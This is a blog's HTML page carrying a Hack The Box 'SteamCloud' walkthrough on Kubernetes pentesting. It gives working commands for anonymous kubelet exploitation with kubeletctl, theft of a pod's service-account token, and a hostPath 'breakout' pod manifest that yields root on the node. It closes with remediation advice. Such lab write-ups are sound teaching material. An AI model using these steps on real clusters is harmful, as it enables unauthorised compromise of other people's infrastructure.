<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>HTB SteamCloud Walkthrough | From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya</title>
<meta name="keywords" content="Walkthrough, HTB, Linux, Kubernetes, Pod-Breakout">
<meta name="description" content="Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation">
<meta name="author" content="Bhavik Kanejiya">
<link rel="canonical" href="https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://bhavik-kanejiya.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://bhavik-kanejiya.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://bhavik-kanejiya.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://bhavik-kanejiya.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://bhavik-kanejiya.github.io/android-chrome-192x192.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/">
  <meta property="og:site_name" content="From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya">
  <meta property="og:title" content="HTB SteamCloud Walkthrough">
  <meta property="og:description" content="Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2025-10-07T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-10-07T00:00:00+00:00">
    <meta property="article:tag" content="Walkthrough">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Kubernetes">
    <meta property="article:tag" content="Pod-Breakout">
      <meta property="og:image" content="https://bhavik-kanejiya.github.io/images/social-image.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://bhavik-kanejiya.github.io/images/social-image.png">
<meta name="twitter:title" content="HTB SteamCloud Walkthrough">
<meta name="twitter:description" content="Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://bhavik-kanejiya.github.io/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HTB SteamCloud Walkthrough",
      "item": "https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HTB SteamCloud Walkthrough",
  "name": "HTB SteamCloud Walkthrough",
  "description": "Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation",
  "keywords": [
    "Walkthrough", "HTB", "Linux", "Kubernetes", "Pod-Breakout"
  ],
  "articleBody": "Box Info Attribute Details Level Easy OS Linux Box URL https://app.hackthebox.com/machines/443 Box Status Retired About Box SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes-specific ports open. We can not enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8S cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate to the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag. Footprinting Nmap - basic Let’s start with scanning the machine IP with nmap to check what are the services are running on different ports!\nnmap -p 22,2379,2380,8443,10249,10250,10256 --min-rate 10000 $ip -oN 1.basic.nmap.txt Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-02 21:45 +0530 Nmap scan report for 10.10.11.133 Host is up (0.25s latency). PORT STATE SERVICE 22/tcp open ssh 2379/tcp open etcd-client 2380/tcp open etcd-server 8443/tcp open https-alt 10249/tcp open unknown 10250/tcp open unknown 10256/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds Nmap - detailed nmap -sCV -p 22,2379,2380,8443,10249,10250,10256 $ip -oN 3.detailed.nmap.txt Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-02 21:55 +0530 Nmap scan report for 10.10.11.133 Host is up (0.31s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA) | 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA) |_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519) 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2025-10-02T16:08:35 |_Not valid after: 2026-10-02T16:08:35 | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time 2380/tcp open ssl/etcd-server? | tls-alpn: |_ h2 | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2025-10-02T16:08:35 |_Not valid after: 2026-10-02T16:08:36 |_ssl-date: TLS randomness does not represent time 8443/tcp open ssl/http Golang net/http server | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 13ad7bea-1258-4ffc-acfb-b23dc09805f8 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd | X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2 | Date: Thu, 02 Oct 2025 16:25:32 GMT | Content-Length: 212 | {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} | GenericLines, Help, RTSPRequest, SSLSessionReq: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 6a334c86-3068-4f26-8887-5adf56610e19 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd | X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2 | Date: Thu, 02 Oct 2025 16:25:29 GMT | Content-Length: 185 |_ {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403} | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2025-10-01T16:08:33 |_Not valid after: 2028-10-01T16:08:33 |_http-title: Site doesn't have a title (application/json). | tls-alpn: | h2 |_ http/1.1 |_ssl-date: TLS randomness does not represent time 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=steamcloud@1759421317 | Subject Alternative Name: DNS:steamcloud | Not valid before: 2025-10-02T15:08:37 |_Not valid after: 2026-10-02T15:08:37 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: TLS randomness does not represent time 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn't have a title (text/plain; charset=utf-8). Found open ports: 22 (SSH), 2379 (etcd), 2380 (etcd), 8443 (http), 10249 (kubelet), 10250 (kubelet), 10256 (http) The web application running on port 8443 is showing 403 Forbidden with the message “User ‘system: anonymous’ cannot get path ‘/’” Identified multiple subject alternative names related to Kubernetes. Subject Alternative Name:\nDNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 Let’s add steamcloud host to our /etc/hosts file:\necho \"10.10.11.133 steamcloud.htb\" | sudo tee -a /etc/hosts Enumeration SSH 22 We tried the same for SSH by attempting an anonymous login, but it was unsuccessful.\nssh anonymous@steamcloud.htb The authenticity of host 'steamcloud.htb (10.10.11.133)' can't be established. ED25519 key fingerprint is SHA256:/BfbWBuZ6K3xx1f7py/c7eMZ1Wedb7sKF5yhMHNXHZ4. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'steamcloud.htb' (ED25519) to the list of known hosts. anonymous@steamcloud.htb's password: Permission denied, please try again. Port 8443 Response Headers:\ncurl -ik https://steamcloud.htb:8443/ HTTP/2 403 audit-id: 852abb91-1bd8-400d-8616-1c7511c78885 cache-control: no-cache, private content-type: application/json x-content-type-options: nosniff x-kubernetes-pf-flowschema-uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd x-kubernetes-pf-prioritylevel-uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2 content-length: 233 date: Thu, 02 Oct 2025 16:34:49 GMT { \"kind\": \"Status\", \"apiVersion\": \"v1\", \"metadata\": { }, \"status\": \"Failure\", \"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\", \"reason\": \"Forbidden\", \"details\": { }, \"code\": 403 } Based on the response headers, it was observed that the application is running on Kubernetes. It was giving a 403 Forbidden, which indicates the Kubernetes API server is rejecting the request because system:anonymous does not have permission to access that path.\n\u003e kubectl --server https://10.10.11.133:8443 get pods Unable to connect to the server: tls: failed to verify certificate: x509: certificate signed by unknown authority I tried to access port 8443 using kubectl, but it was asking for a valid username and password, which I couldn’t brute-force.\nKubernetes Ports Protocol Direction Port Range Purpose Used By TCP Inbound 6443 Kubernetes API server All TCP Inbound 2379-2380 etcd server client API kube-apiserver, etcd TCP Inbound 10250 Kubelet API Self, Control plane TCP Inbound 10259 kube-scheduler Self TCP Inbound 10257 kube-controller-manager Self Reference: https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane\nPort 10250 Port 10250 on the kubelet is used by the kube-apiserver for exec and logs.\nI came across this gist repo about “Accessing the kubelet-api” by lizrice. First, I tried to list pods using a simple GET request to check whether listing pods as anonymous-auth was possible.\ncurl -sk https://10.10.11.133:10250/pods/ If --anonymous-auth is turned off, you will see a 401 Unauthorized response. If --anonymous-auth is true and --authorization-mode is Webhook you’ll see 403 Forbidden response with message Forbidden (user=system:anonymous, verb=get, resource=nodes, subresource=proxy) If --anonymous-auth is true and --authorization-mode is AlwaysAllow you’ll see a list of pods. We got the proper 200 OK response which means that --anonymous-auth is true and --authorization-mode is AlwaysAllow.\nResponse:\n{\"kind\":\"PodList\",\"apiVersion\":\"v1\",\"metadata\":{},\"items\":[{\"metadata\":{\"name\":\"etcd-steamcloud\",\"namespace\":\"kube-system\",\"selfLink\":\"/api/v1/namespaces/kube-system/pods/etcd-steamcloud\",\"uid\":\"967b9bee71f2e3cec06ff1dbde2a2a19\",\"creationTimestamp\":null,\"labels\":{\"component\":\"etcd\",\"tier\":\"control-plane\"},\"annotations\":{\"kubeadm.kubernetes.io/etcd.advertise-client-urls\":\"https://10.10.11.133:2379\",\"kubernetes.io/config.hash\":\"967b9bee71f2e3cec06ff1dbde2a2a19\",\"kubernetes.io/config.seen\":\"2025-10-02T12:08:51.371667834-04:00\",\"kubernetes.io/config.source\":\"file\"}} We found the article by cyberark about kubelet client attack which shows how to use the different api endpoints manually to list pods or run the commands insides the container. While using this command one by one to find the token and go though the multiple directories it will be complicated and time consuming at the same time.\nKubelet API endpoints to perform the multiple task:\nKubelet API Examples for use Description /pods GET /pods List the pods in the kubelet’s worker /run POST /run/// POST /run//// Body: Run command in a container /exec GET /exec///?command= POST /exec///?command= GET /exec////?command= POST /exec////?command= Run command using a stream in a container /configz GET /configz Kubelet’s configuration file settings /debug GET /debug/flags/v\nPUT /debug/flags/v (body: ) GET /debug/pprof/ Debug information Kubeletctl The above mentioned blog also mentions about the tool called kubeletctl which can be used to make command execution and pods listing process easy. If you are using mac to solve this problem you might face issue while installing and using the tool. It’s recommended to use the docker image which can be easiest way to install and run the tool without facing any architecture or dependency related issue.\nList the running pods using below mentioned command and it will give the proper table format output.\n/ $ kubeletctl pods --server 10.10.11.133 ┌────────────────────────────────────────────────────────────────────────────────┐ │ Pods from Kubelet │ ├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤ │ │ POD │ NAMESPACE │ CONTAINERS │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 1 │ coredns-78fcd69978-l4jd5 │ kube-system │ coredns │ │ │ │ │ │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 2 │ nginx │ default │ nginx │ │ │ │ │ │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 3 │ etcd-steamcloud │ kube-system │ etcd │ │ │ │ │ │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 4 │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ │ │ │ │ │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 5 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ │ │ │ │ │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 6 │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ │ │ │ │ │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 7 │ storage-provisioner │ kube-system │ storage-provisioner │ │ │ │ │ │ ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤ │ 8 │ kube-proxy-5lw7m │ kube-system │ kube-proxy │ │ │ │ │ │ └───┴────────────────────────────────────┴─────────────┴─────────────────────────┘ Scan for command execution related permission:\nkubeletctl scan rce --server 10.10.11.133 ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐ │ Node with pods vulnerable to RCE │ ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤ │ │ NODE IP │ PODS │ NAMESPACE │ CONTAINERS │ RCE │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ │ │ │ │ │ RUN │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 1 │ 10.10.11.133 │ kube-scheduler-steamcloud │ kube-system │ kube-scheduler │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 2 │ │ storage-provisioner │ kube-system │ storage-provisioner │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 3 │ │ kube-proxy-5lw7m │ kube-system │ kube-proxy │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 4 │ │ coredns-78fcd69978-l4jd5 │ kube-system │ coredns │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 5 │ │ nginx │ default │ nginx │ + │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 6 │ │ etcd-steamcloud │ kube-system │ etcd │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 7 │ │ kube-apiserver-steamcloud │ kube-system │ kube-apiserver │ - │ ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤ │ 8 │ │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ - │ └───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘ Getting User shell Based on kubeletctl scan rce command, We will go ahead and attack the ngnix pod and run the whoami command and it was observed that the pod is running as the root.\n/ $ kubeletctl exec \"whoami\" -p nginx -c nginx --server 10.10.11.133 root Instead of passing command using the kubeletctl exec we can simply go ahead any take a shell so we can interact with a shell properly and do further enumeration to get the user flag.\n/ $ kubeletctl exec \"/bin/bash\" -p nginx -c nginx --server 10.10.11.133 root@nginx:/# User Flag 🚩 We have the shell. Let’s read the user flag and move ahead for root flag.\nroot@nginx:~# ls user.txt root@nginx:~# cat user.txt REDECTED_FLAG_VALUE We already have the root user access but flag doesn’t exist in the /root directory. We can check the env and mounted directory or we can run the linpeas as well.\nThe environment variables:\nroot@nginx:~# env HOSTNAME=nginx NJS_VERSION=1.14.2.0.2.6-1~stretch NGINX_VERSION=1.14.2-1~stretch KUBERNETES_PORT_443_TCP_PROTO=tcp KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 KUBERNETES_PORT=tcp://10.96.0.1:443 PWD=/root HOME=/root KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 TERM=xterm SHLVL=1 KUBERNETES_SERVICE_PORT=443 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_SERVICE_HOST=10.96.0.1 OLDPWD=/var/run/secrets/kubernetes.io/serviceaccount _=/usr/bin/env The mounted directory:\nroot@nginx:~# df -h df -h Filesystem Size Used Avail Use% Mounted on overlay 8.9G 3.2G 5.6G 37% / tmpfs 64M 0 64M 0% /dev tmpfs 2.0G 0 2.0G 0% /sys/fs/cgroup /dev/sda1 8.9G 3.2G 5.6G 37% /root shm 64M 0 64M 0% /dev/shm tmpfs 3.9G 12K 3.9G 1% /run/secrets/kubernetes.io/serviceaccount tmpfs 2.0G 0 2.0G 0% /proc/acpi tmpfs 2.0G 0 2.0G 0% /sys/firmware root@nginx:~# cd /run/secrets/kubernetes.io/serviceaccount cd /run/secrets/kubernetes.io/serviceaccount root@nginx:/run/secrets/kubernetes.io/serviceaccount# ls ca.crt\tnamespace token What is a Kubernetes Serviceaccount? A ServiceAccount is an identity for processes running inside Pods. When a Pod runs, by default Kubernetes mounts credentials for a ServiceAccount into the Pod so the process can call the Kubernetes API as that identity. These credentials are how workloads authenticate to the API server.\nWhat lives at /run/secrets/kubernetes.io/serviceaccount directory? Inside most container images we’ll see these files:\ntoken - a JWT bearer token. This token lets the Pod authenticate to the API server. ca.crt - CA certificate to validate the API server TLS certificate. namespace - the namespace the Pod is running in. Why this matters for privilege escalation If an attacker can read that token file inside a pod, they can use that token to call the Kubernetes API and act with whatever RBAC permissions the ServiceAccount has.\nDiscovery: enumerate pods, namespaces, secrets, nodes, roles. Privilege escalation: if the service account has wide permissions, can create resources (new Pods, ClusterRoleBindings) to escalate to cluster-admin or access sensitive secrets such as cloud credentials. Lateral movement: read secrets, mount host filesystem, create pods with host access to extract files. Privilege Escalation Let’s go inside the /run/secrets/kubernetes.io/serviceaccount and save the CA.crt and token file in local system so we can use it to check the permission this token has.\nSave the token: Save the ca.crt: Now, Let’s use the kubectl tool which allows user to interact with the Kubernetes API and the control plane.\nWe tried to use this token with the server ip 10.10.11.133 with port 10250 but server send us the certificate validation related error.\nCommand:\nkubectl --server https://10.10.11.133:10250 --certificate-authority=ca.crt --token=token get namespaces Server Validation Error:\nE1002 23:16:05.190516 35485 memcache.go:265] \"Unhandled Error\" err=\"couldn't get current server API group list: Get \\\"https://10.10.11.133:10250/api?timeout=32s\\\": tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn't contain any IP SANs\" E1002 23:16:05.890616 35485 memcache.go:265] \"Unhandled Error\" err=\"couldn't get current server API group list: Get \\\"https://10.10.11.133:10250/api?timeout=32s\\\": tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn't contain any IP SANs\" We have updated the port number from 10250 to 8443. The reason is we have seen the access forbidden error. Let’s pass the token value and ca.crt file which will help server to validate the user access request.\nWe tried to list he pods and we are able to list the pods. From here what we can do is check what kind of permission that token and use it to get root flag.\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pods NAME READY STATUS RESTARTS AGE nginx 1/1 Running 0 99m User doesn’t have permission to get namespace:\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces Error from server (Forbidden): namespaces is forbidden: User \"system:serviceaccount:default:default\" cannot list resource \"namespaces\" in API group \"\" at the cluster scope The user has permission to check permission:\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] pods [] [] [get create list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [/api] [] [get] [/apis/*] [] [get] [/apis] [] [get] [/healthz] [] [get] [/healthz] [] [get] [/livez] [] [get] [/livez] [] [get] [/openapi/*] [] [get] [/openapi] [] [get] [/openid/v1/jwks] [] [get] [/readyz] [] [get] [/readyz] [] [get] [/version/] [] [get] [/version/] [] [get] [/version] [] [get] [/version] [] [get] List the permission table which shows user can get, create and list pods. Let’s create a pod with accessive privilege which can be use to do pod breakout.\nPod creation policy, which can be used to do Pod Breakout:\napiVersion: v1 kind: Pod metadata: name: breakout namespace: default spec: hostNetwork: true automountServiceAccountToken: true containers: - name: breakout image: nginx:latest volumeMounts: - mountPath: /root name: mount-root volumes: - name: mount-root hostPath: path: / Use Pod creation policy to create a pod with elevated privileges:\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f Pod-Breakout.yaml pod/breakout created You can also refer to the detailed blog presented bishopfox. They have discussed 8 different scenarios based on the limited pod creation permission user has. Checkout the blog it’s actually interesting one to read.\nLet’s use the kubectl get pods command with the ca.crt file and token. It was observed that the pod we created is up and running. Let’s move back to the kubeletctl tool because we don’t have pod execution permission with the token we are using in the kubectl command.\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pods NAME READY STATUS RESTARTS AGE breakout 1/1 Running 0 36s nginx 1/1 Running 0 102m Run the kubeletctl with whoami command on the breakout pod, and we are already running as root.\nkubeletctl exec \"whoami\" -p breakout -c breakout --server 10.10.11.133 root Let’s take a shell\nkubeletctl exec \"/bin/bash\" -p breakout -c breakout --server 10.10.11.133 root@steamcloud:/# Root Flag 🚩 root@steamcloud:~/root# ls root.txt root@steamcloud:~/root# cat root.txt REDECTED_FLAG_VALUE Conclusion Streamcloud is a compact but instructive lab that highlights how small misconfigurations in Kubernetes, like overly permissive service accounts, exposed APIs, or incorrect RBAC rules, quickly turn into full cluster compromise. The lab reinforces that Kubernetes security is a shared responsibility: developers, SREs, and security teams all need to work together to reduce blast radius.\nKey Takeaways Always apply least privilege - avoid granting cluster-admin or wildcard verbs to serviceAccounts. Expose only necessary APIs - kubelet and API server endpoints should be firewall/ACL protected. RBAC misconfigurations are a frequent root cause - regularly review roles, roleBindings, clusterRoles, and clusterRoleBindings. References https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster https://www.covertswarm.com/post/k8s-pod-to-node-escape-techniques https://bishopfox.com/blog/kubernetes-pod-privilege-escalation https://github.com/cyberark/kubeletctl/ Connect with me LinkedIn Twitter GitHub ",
  "wordCount" : "2714",
  "inLanguage": "en",
  "image": "https://bhavik-kanejiya.github.io/images/social-image.png","datePublished": "2025-10-07T00:00:00Z",
  "dateModified": "2025-10-07T00:00:00Z",
  "author":[{
    "@type": "Person",
    "name": "Bhavik Kanejiya"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "From Bits to Bytes | Cybersecurity Insights by Bhavik Kanejiya",
    "logo": {
      "@type": "ImageObject",
      "url": "https://bhavik-kanejiya.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://bhavik-kanejiya.github.io/" accesskey="h" title="Home (Alt + H)">
                <img src="https://bhavik-kanejiya.github.io/apple-touch-icon.png" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://bhavik-kanejiya.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://bhavik-kanejiya.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      HTB SteamCloud Walkthrough
    </h1>
    <div class="post-description">
      Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation
    </div>
    <div class="post-meta"><span title='2025-10-07 00:00:00 +0000 UTC'>October 7, 2025</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;Bhavik Kanejiya

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#box-info" aria-label="Box Info">Box Info</a></li>
                <li>
                    <a href="#footprinting" aria-label="Footprinting">Footprinting</a><ul>
                        
                <li>
                    <a href="#nmap---basic" aria-label="Nmap - basic">Nmap - basic</a></li>
                <li>
